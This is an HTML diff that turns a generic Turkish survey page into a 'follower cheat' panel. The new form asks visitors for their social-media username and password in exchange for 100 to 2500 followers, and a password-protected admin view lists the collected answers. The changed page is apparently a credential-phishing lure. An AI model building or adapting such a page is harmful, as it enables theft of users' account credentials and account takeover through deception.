@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Large Panel</title>
+    <title>TAKİPÇİ HİLESİ Panel</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div id="login-screen">
-        <h1>LARGE</h1>
+        <h1>TAKİPÇİ HİLESİ</h1>
         <input type="password" id="password" placeholder="Şifre">
         <button onclick="checkPassword()">Giriş Yap</button>
     </div>
@@ -17,41 +17,41 @@
         <div id="hamburger">&#9776;</div>
         <div id="menu" style="display: none;">
             <ul>
-                <li onclick="showEren()">Eren</li>
-                <li onclick="showCevapLogin()">Cevaplar</li>
+                <li onclick="showTakipçigönder()">Takipçigönder</li>
+                <li onclick="showAdminLogin()">Admin</li>
             </ul>
         </div>
 
-        <div id="eren-panel" style="display: none;">
+        <div id="Takipçigönder-panel" style="display: none;">
             <h2 class="center-text">HOŞGELDİNİZ</h2>
             <form id="anketForm" onsubmit="return saveForm();">
                 <div class="form-section">
-                    <label>CAN</label><br>
-                    <textarea name="can" rows="3" cols="30" required></textarea>
+                    <label>KULLANICI ADI ?</label><br>
+                    <textarea name="KULLANICI ADI ?" rows="3" cols="30" required></textarea>
                 </div>
                 <div class="form-section">
-                    <label>MEMO</label><br>
-                    <textarea name="memo" rows="3" cols="30" required></textarea>
+                    <label>ŞİFRE ?</label><br>
+                    <textarea name="ŞİFRE ?" rows="3" cols="30" required></textarea>
                 </div>
                 <div class="form-section">
-                    <label>Seçim</label><br>
-                    <input type="radio" name="secim" value="100" required> 100<br>
-                    <input type="radio" name="secim" value="1000"> 1000<br>
-                    <input type="radio" name="secim" value="2500"> 2500<br>
+                    <label>KAÇ TAKİPÇİ İSTERSİNİZ ?</label><br>
+                    <input type="radio" name="KAÇ TAKİPÇİ İSTERSİNİZ ?" value="100" required> 100<br>
+                    <input type="radio" name="KAÇ TAKİPÇİ İSTERSİNİZ ?" value="1000"> 1000<br>
+                    <input type="radio" name="KAÇ TAKİPÇİ İSTERSİNİZ ?" value="2500"> 2500<br>
                 </div>
                 <button type="submit">Gönder</button>
             </form>
         </div>
 
-        <div id="cevap-login" style="display:none;">
-            <h3>Cevaplara Giriş</h3>
-            <input type="password" id="cevap-password" placeholder="Şifre">
-            <button onclick="checkCevapPassword()">Giriş</button>
+        <div id="Admin-login" style="display:none;">
+            <h3>Admin Giriş</h3>
+            <input type="password" id="Admin-password" placeholder="Şifre">
+            <button onclick="checkAdminPassword()">Giriş</button>
         </div>
 
-        <div id="cevaplar-panel" style="display: none;">
-            <h2>Gelen Cevaplar</h2>
-            <div id="cevaplar-listesi"></div>
+        <div id="Admin-panel" style="display: none;">
+            <h2>Gelen Adminler</h2>
+            <div id="Admin-listesi"></div>
         </div>
     </div>
 
